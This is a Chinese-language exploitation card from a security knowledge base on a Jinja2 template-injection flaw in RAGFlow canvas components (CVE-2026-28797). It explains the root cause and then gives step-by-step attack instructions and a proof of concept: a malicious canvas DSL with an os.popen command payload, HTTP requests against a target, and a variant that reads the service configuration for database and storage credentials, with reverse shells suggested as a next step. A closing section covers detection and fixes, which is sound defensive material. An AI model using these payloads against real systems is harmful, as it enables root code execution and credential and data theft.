---
id: web-python-ssti-ragflow-canvas-component-jinja2-rce
title: RAGFlow canvas 组件 Jinja2 SSTI：StringTransform/Message 渲染用户脚本到 root RCE（CVE-2026-28797）
type: scenario
domain: web
path: web/python/ssti
technique: ragflow-canvas-component-jinja2-ssti
aliases:
- RAGFlow SSTI
- CVE-2026-28797
- canvas script Jinja2
- StringTransform SSTI
- Message stream=False SSTI
- _is_jinjia2 正则跨行检测缺陷
tags:
- ssti
- jinja2
- ragflow
- python
- rce
- canvas
- ai
- rag
- cve-2026-28797
cve:
- CVE-2026-28797
severity: high
confidence: high
affected_versions: RAGFlow <= 0.24.0（v0.25.0 起修复）
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: orchestrator-fix
  verified_at: '2026-11-05T23:08:23+08:00'
  notes: V105 指出换行绕过只对 _is_jinjia2 检测函数成立；已修正为检测 False 不渲染、Message stream=False 才是真正入口
---

## 一句话结论

RAGFlow 的 canvas 组件参数（StringTransform 的 `script`、Message 的 `content`）会被直接交给非沙箱的 `jinja2.Template` 渲染；普通注册用户只要创建包含恶意 `script` 的画布并触发 completion，就能用 `{{ cycler.__init__.__globals__.os.popen("id").read() }}` 以 root 执行命令。CVE-2026-28797 影响 v0.24.0 及之前，v0.25.0 才用 SandboxedEnvironment 修复；Message 组件在 `stream=False` 时没有模板语法检测、直接渲染；`_is_jinjia2` 正则可被换行绕过而返回 False，但检测为 False 的分支不会渲染模板，换行本身不构成可用绕过。

## 原理

- **渲染入口**：RAGFlow 的 canvas 是一张可视化流程图，后台存成嵌套 JSON DSL，组件用 `obj.component_name` 和 `params` 描述。StringTransform 组件的 `script` 参数用于“处理逻辑”，源码直接 `template = Jinja2Template(script); script = template.render(kwargs)`；`Jinja2Template` 就是 `from jinja2 import Template`，不是 `SandboxedEnvironment`。用户可控字符串因此被当作 Jinja2 模板执行。
- **Message 组件的无条件渲染**：`message.py` 中 `template = Jinja2Template(rand_cnt); content = template.render(kwargs)`。`_is_jinjia2(s)` 只在 `stream=True` 分支用于判断“像不像模板”；当 `stream=False` 时，内容直接进 Jinja2 渲染，连 `{{`/`{%` 检测都没有，等于无条件 SSTI。
- **检测正则不跨行**：`_is_jinjia2` 使用 `re.search(r'\{%.*%\}', s)`、`r'\{\{.*\}\}'`、`r'\}\}'`，没有 `re.DOTALL`，`.` 不匹配换行。把 payload 写成 `{%\n...\n%}` 即可让检测返回 False；StringTransform 的检测分支被绕过，Message 的 stream=False 分支则根本不需要检测。
- **两条 API 完成利用**：`/v1/canvas/debug` 不落库，且请求 params 覆盖不了组件创建时固化在 `self._param.script` 的值，不能用来注入。真正路径是 `POST /v1/canvas/set` 把恶意 DSL 存入画布，再 `POST /v1/canvas/completion` 触发执行；completion 返回 SSE，节点完成时 `node_finished` 事件的 `outputs` 带执行结果。
- **认证细节**：注册 `POST /v1/user/register`，密码需先用 `public.pem` 做 RSA PKCS1_v1_5 加密（加密对象是 base64 后的明文）；登录成功后凭证在响应头 `Authorization` 中（Quart-Auth 用 SECRET_KEY 签名的 itsdangerous token），body 里的 `access_token` 只是 UUID，拿它调 API 会 401。
- **DSL 隐藏要求**：`retrieval` 必须是数组（空数组也可，null 会报错）；`answer` 要指向组件 id，结果才会进 SSE。
- **危害**：`{{ cycler.__init__.__globals__.os.popen("id").read() }}` 返回 `uid=0(root)`；可继续读 `/ragflow/conf/service_conf.yaml` 获取 MySQL/MinIO/Elasticsearch 凭证，进一步取知识库文档与向量数据。
- **修复与时间窗**：v0.25.0 的 commit `7fc97da610` 将 `jinja2.Template` 换成 `jinja2.sandbox.SandboxedEnvironment`，cycler/lipsum/`__class__` 链均被 `SecurityError` 拦截。但 v0.24.0 于 2 月 10 日发布、修复 3 月 2 日合入、v0.25.0 到 4 月 21 日才发布，中间约两个半月 v0.24.0 实例裸奔；且 v0.26.4 的 Message 组件在 `stream=False` 时仍无条件渲染，只是依赖沙箱强度。

## 触发条件

- RAGFlow <= 0.24.0（NVD: 0.24.0 and prior），且 canvas 组件使用原生 Jinja2 Template 渲染。
- 目标开放注册，或攻击者拥有任意普通账号；普通用户可创建并运行 canvas。
- 攻击者可访问 `/v1/canvas/set` 与 `/v1/canvas/completion`，并能拿到登录响应头里的 Authorization token。
- 目标容器以 root 运行（官方 Docker 默认），SSTI 直接获得 root RCE；非 root 也会以服务用户权限执行。
- 若走 Message 组件，`stream=False` 没有模板语法检测、直接渲染；StringTransform 在 `_is_jinjia2` 返回 False 时不会渲染，换行绕过只影响检测结果、不能单独构成利用。

## 利用步骤

1. 注册普通账号：`POST /v1/user/register`，密码用 `/ragflow/conf/public.pem` 公钥 RSA PKCS1_v1_5 加密（先 base64 明文）。
2. 登录：`POST /v1/user/login`，从响应头取完整 `Authorization` 值；不要用 body 里的 `access_token` UUID。
3. 构造恶意 DSL：`begin` 下游接一个 `StringTransform`（`script` 填 payload）或 `Message`（`content` 填 payload，`stream=False`）；`retrieval: []`，`answer` 指向该组件 id。
4. `POST /v1/canvas/set` 保存画布，拿返回的 canvas id。
5. `POST /v1/canvas/completion`，body 为 `{"id": "<canvas_id>", "query": "hello"}`，curl 加 `-N` 读 SSE；在 `node_finished.outputs` 中取命令输出。
6. 将 payload 换成读 `service_conf.yaml`、反弹 shell、写文件等；用拿到的数据库/MinIO 凭证进一步取数据。

## PoC

原文的关键请求与 payload（未在本机执行；完整 DSL 需按目标版本字段补齐）：

```python
# 登录前：RSA 加密密码（PKCS1_v1_5，公钥来自 /ragflow/conf/public.pem）
# 登录后：从响应头 Authorization 取 token

# 最小画布 DSL（StringTransform）
dsl = {
    "components": {
        "begin": {"obj": {"component_name": "Begin", "params": {}},
                  "downstream": ["c0"], "upstream": []},
        "c0": {"obj": {
            "component_name": "StringTransform",
            "params": {
                "method": "merge",
                "script": '{{ cycler.__init__.__globals__.os.popen("id").read() }}',
                "delimiters": [","]
            }
        }, "downstream": [], "upstream": ["begin"]}
    },
    "history": [], "path": ["begin"], "retrieval": [], "answer": ["c0"]
}
```

```http
POST /v1/canvas/set HTTP/1.1
Host: TARGET:9380
Authorization: <登录响应头中的完整 Authorization 值>
Content-Type: application/json

<上面的 DSL>
```

```http
POST /v1/canvas/completion HTTP/1.1
Host: TARGET:9380
Authorization: <Authorization>
Content-Type: application/json

{"id": "<canvas_id>", "query": "hello"}
```

```text
# SSE 中 node_finished 的 outputs 返回：
# uid=0(root) gid=0(root) groups=0(root)

# 读配置：
# {{ cycler.__init__.__globals__.os.popen("cat /ragflow/conf/service_conf.yaml").read() }}

# Message 组件变体（stream=False 无条件渲染）：
# content = '{{ cycler.__init__.__globals__.os.popen("id").read() }}'
# stream = False

# 换行只能让 _is_jinjia2 返回 False；检测为 False 不会渲染，不能单独绕过 StringTransform：
# '{%
#  print(7*7)
#  %}'
```

## 变体与关联

- **组件变体**：StringTransform 的 `script`、Message 的 `content`；未来任何把用户字符串交给 `Jinja2Template`/`from_string` 的组件都是同类入口。
- **检测绕过变体**：`{%\n...\n%}` 换行绕过无 DOTALL 的正则；`{{`/`{%` 的其他语法、Jinja2 注释 `{# #}`、字符串拼接、低资源语言/编码混淆。
- **SSTI 链变体**：`cycler.__init__.__globals__`、`lipsum.__globals__`、`''.__class__.__mro__` 子类索引、`__builtins__` 等；沙箱下需寻找新的 gadget。
- **关联卡片**：[[web-python-ssti-jinja2-flask-globals-rce]]（Flask/Jinja2 globals RCE）、[[web-python-ssti-jinja2-subclasses-index-rce]]（子类索引链）、[[web-python-ssti-jinja2-waf-bypass-hex-attr-args]]（Jinja2 WAF 绕过）、[[ai-security-agent-security-langflow-build-public-tmp-data-code-exec]]（同类 AI 编排平台的组件代码执行）。
- **边界**：原文在 RAGFlow v0.24.0 实测 root；不同版本字段名/认证流程可能变化。PoC 未在本机执行，需按目标版本补齐画布 DSL 与登录加密。

## 检测与防御

- **治本**：所有 `Jinja2Template`/`from_string` 调用点统一换成 `jinja2.sandbox.SandboxedEnvironment`，不要只改 StringTransform；Message、以及未来新增组件都要覆盖。
- **不要依赖黑名单**：`_is_jinjia2` 这类正则只能拦已知语法，换行即可绕过；应使用沙箱 + 最小权限，而不是追着攻击者补正则。
- **权限与隔离**：canvas 组件以低权用户/容器运行，禁止 root；限制对 `/ragflow/conf`、数据库、MinIO、宿主机路径的访问；对组件脚本做沙箱/资源限制。
- **版本与发布**：升级到 v0.25.0+；注意“修复合入 ≠ 已发布”，检查实际运行版本；Message 在 stream=False 下仍依赖沙箱，需持续关注沙箱绕过。
- **部署面**：关闭公网开放注册，内网部署，反向代理加认证；限制 canvas 创建/执行权限。
- **检测**：审计 canvas DSL 中的 `script`/`content` 是否含 Jinja2 语法；监控 `node_finished` 中出现 `uid=`、`/etc/passwd`、`service_conf.yaml` 等异常输出；对 Jinja2 渲染入口做静态扫描。
